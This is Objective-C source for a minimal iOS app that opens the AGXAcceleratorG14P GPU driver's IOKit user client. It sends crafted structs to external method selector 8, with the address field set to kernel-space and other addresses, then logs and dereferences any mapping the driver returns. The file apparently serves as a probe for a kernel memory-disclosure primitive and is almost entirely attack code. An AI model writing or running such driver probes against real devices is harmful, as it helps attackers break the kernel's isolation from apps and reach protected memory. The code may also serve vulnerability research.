#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <Foundation/Foundation.h>
#import <string.h>
#import <stdlib.h>
#import <mach/mach.h>
#import <mach/vm_region.h>

static NSMutableString *gLog; static NSString *gPath;
static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt); NSString *s=[[NSString alloc] initWithFormat:fmt arguments:ap]; va_end(ap);
    [gLog appendString:s]; [gLog appendString:@"\n"];
    [gLog writeToFile:gPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    NSLog(@"[type40] %@",s);
}
static uint64_t rd64(const void *p){uint64_t v;memcpy(&v,p,8);return v;}
static void run(void){
    io_service_t svc=IOServiceGetMatchingService(kIOMasterPortDefault,IOServiceMatching("AGXAcceleratorG14P"));
    if(!svc){L(@"no svc");return;}
    io_connect_t c=0; kern_return_t kr=IOServiceOpen(svc,mach_task_self(),1,&c); IOObjectRelease(svc);
    L(@"[open] 0x%x",kr); if(kr)return;
    uint64_t addrs[]={0xfffffff007004000ULL,0xfffffff00af00000ULL,0x04D00000ULL,0x100000000ULL,0ULL,0xfffffff007004000ULL+0x1000000ULL};
    for(unsigned t=0;t<sizeof(addrs)/sizeof(addrs[0]);t++){
        uint8_t in[0x100]; memset(in,0,sizeof(in));
        *(uint32_t*)(in+0x00)=0x40;
        *(uint64_t*)(in+0x18)=0;          // protection <=0xf
        *(uint64_t*)(in+0x38)=addrs[t];   // addr
        *(uint64_t*)(in+0x40)=0x4000;     // length
        *(uint64_t*)(in+0x48)=0;          // offset
        *(uint32_t*)(in+0x50)=0x4000;     // page size
        uint8_t out[0x1000]; memset(out,0,sizeof(out)); size_t os=sizeof(out);
        kr=IOConnectCallStructMethod(c,8,in,0x100,out,&os);
        L(@"[sel8t40] addr=0x%llx -> 0x%x osz=0x%zx",(unsigned long long)addrs[t],kr,os);
        for(int i=0;i<16;i++) L(@"[q] q%d=0x%llx",i,(unsigned long long)rd64(out+i*8));
        if (!kr) {
            uint64_t q3 = rd64(out+0x18);
            if (q3 > 0x100000000ULL) {
                vm_address_t a=(vm_address_t)q3; vm_size_t sz=0; vm_region_basic_info_data_64_t bi;
                mach_port_t obj=0; mach_msg_type_number_t cnt=VM_REGION_BASIC_INFO_COUNT_64;
                kern_return_t mr=vm_region_64(mach_task_self(),&a,&sz,VM_REGION_BASIC_INFO_64,
                                              (vm_region_info_t)&bi,&cnt,&obj);
                L(@"[map q3] 0x%llx region=0x%x addr=0x%llx size=0x%llx prot=%d max=%d",
                  (unsigned long long)q3,mr,(unsigned long long)a,(unsigned long long)sz,
                  bi.protection,bi.max_protection);
                if(obj) mach_port_deallocate(mach_task_self(),obj);
                if(mr==0){
                    for(int i=0;i<0x40;i+=8) L(@"[q3] +0x%x = 0x%llx",i,
                        (unsigned long long)*(volatile uint64_t*)(q3+i));
                }
            }
        }
    }
    IOServiceClose(c); L(@"=== done ===");
}
@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end
@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    self.window=[[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc=[UIViewController new]; vc.view.backgroundColor=UIColor.blackColor;
    UITextView *tv=[[UITextView alloc] initWithFrame:vc.view.bounds];
    tv.backgroundColor=UIColor.blackColor; tv.textColor=UIColor.greenColor;
    tv.font=[UIFont monospacedSystemFontOfSize:9 weight:UIFontWeightRegular]; tv.editable=NO; tv.text=@"Type40\n";
    [vc.view addSubview:tv]; self.window.rootViewController=vc; [self.window makeKeyAndVisible];
    [UIApplication sharedApplication].idleTimerDisabled=YES;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH,0),^{
        NSString *docs=[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES) firstObject];
        gPath=[docs stringByAppendingPathComponent:@"type40.log"]; gLog=[NSMutableString new]; run();
        dispatch_async(dispatch_get_main_queue(),^{tv.text=gLog;});
    });
    return YES;
}
@end
int main(int argc,char**argv){@autoreleasepool{return UIApplicationMain(argc,argv,nil,NSStringFromClass([AppDelegate class]));}}
